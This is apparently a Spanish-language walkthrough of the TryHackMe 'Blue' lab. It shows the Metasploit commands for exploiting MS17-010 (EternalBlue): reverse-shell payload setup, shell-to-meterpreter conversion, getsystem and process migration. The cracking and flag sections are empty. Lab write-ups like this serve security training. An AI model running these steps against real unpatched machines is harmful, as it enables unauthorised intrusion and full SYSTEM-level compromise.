
# Máquina Blue

Dificultad -> Fácil

Enlace a la máquina -> [Blue](https://tryhackme.com/room/blue)

El objetivo de la máquina es distintas flags. La máquina Blue de TryHackMe es una máquina Windows muy sencilla para principiantes cuyo objetivo es aprender a explotar la vulnerabilidad MS17-010 (EternalBlue), la misma que utilizó el ransomware WannaCry en 2017.

## Despliegue del laboratorio

Desplegar VPN y comprobar la interfaz tun0 con `ip a`.


## Recon

Tenemos que hacer un escaneo de los 1000 primeros puertos y responder cuántos son vulnerables. 
```bash
nmap -p 1-1000 IP
```

Vemos 3 puertos vulnerables: 135 (RPC), 139 (SMB NetBios) y 445 (SMB).

Sabemos que la máquina hace referencia al SMB, puesto que hay que aprovechar la vulnerabilidad Eternal Blue. Nos pide identificar el identificador de la vulnerabilidad de Microsoft. Para ello abrimos Metasploit y buscamos Eternal Blue:
```bash
mfsconsole
search Eternal Blue
```
 En el primer exploit nos sale ahí el ID:
 <img width="781" height="292" alt="imagen" src="https://github.com/user-attachments/assets/da91dd6a-2a10-4f5e-963a-8cd03f34a87d" />

MS17-010
<br>
 

## Gain Access

Aquí nos pide abrir Metasploit y buscar el nombre del exploit completo:
```text
exploit/windows/smb/ms17_010_eternalblue
```

Vamos a usar el exploit:
```bash
use 0
show options
```

Tenemos que añadir el host de la víctima:
```bash
set RHOSTS IP
```

Tal y como está configurado ya debería funcionar. Sin embargo el laboratorio nos pide que cambiemos el payload a usar:
```bash
set payload windows/x64/shell/reverse_tcp
```

El exploit aprovecha una vulnerabilidad para entrar al sistema.

El payload es lo que quieres que ocurra una vez que el exploit funciona.


Este payload nuevo lo que hace es ejecutar una reverse shell en Windows x64. Una reverse shell es una conexión desde la víctima a mi máquina Kali. Despues ejecutamos el exploit: `exploit`.

Ahora nos piden enviar la shell a segundo plano (Ctrl+Z). Se nos guardará la sesión, podemos verla en:
```bash
sessions
sessions -i 1   # acceder a la sesión
```


## Escalate 

**Si todavía no lo has hecho, envía la shell obtenida anteriormente a segundo plano (CTRL + Z). Investiga cómo convertir una shell normal en una sesión Meterpreter usando Metasploit. ¿Cuál es el nombre del módulo de post-explotación que vamos a utilizar? (Escribe la ruta exacta, igual que hiciste con el exploit anterior).**

Ya hemos explotado la máquina. Ahora hay que buscar un módulo post, de post-explotación. Buscamos en Metasploit un módulo que transforme de shell a meterpreter:
```search
search shell_to_meterpreter
use 0
```
Hay que usar el módulo: `post/multi/manage/shell_to_meterpreter`


**Selecciona ese módulo (utiliza MODULE_PATH). Ejecuta `show options`. ¿Qué opción es obligatorio modificar?**

```bash
run           # vemos que falta el parámetro SESSION
show options
```

**Configura la opción necesaria. Puede que tengas que listar todas las sesiones para encontrar la sesión objetivo.**

**Ejecuta el módulo. Si no funciona, vuelve a realizar el exploit del ejercicio anterior e inténtalo de nuevo.**

**Cuando la conversión a Meterpreter termine correctamente, selecciona esa nueva sesión para trabajar con ella.**

**Comprueba que has escalado privilegios a **NT AUTHORITY\SYSTEM**. Ejecuta `getsystem` para confirmarlo. Si quieres, abre una consola de CMD con el comando `shell` y ejecuta `whoami`. Debería devolver que eres **SYSTEM**. Después, envía esa shell a segundo plano y vuelve a seleccionar la sesión de Meterpreter.**


**Lista todos los procesos en ejecución con el comando `ps`. Aunque seas **SYSTEM**, eso no significa que el proceso en el que estás ejecutándote también lo sea. Busca, hacia el final de la lista, un proceso que se esté ejecutando como **NT AUTHORITY\SYSTEM** y anota su **PID** (la primera columna de la izquierda).**


**Migra a ese proceso utilizando el comando `migrate PROCESS_ID`, sustituyendo `PROCESS_ID` por el PID que acabas de anotar. Puede que tengas que intentarlo varias veces, ya que la migración de procesos no siempre es estable. Si falla, puede que tengas que volver a realizar la conversión a Meterpreter o reiniciar la máquina y empezar de nuevo. Si ocurre, prueba con otro proceso la próxima vez.**



## Cracking




## Find flags!



 Máquina completada: Blue ✅

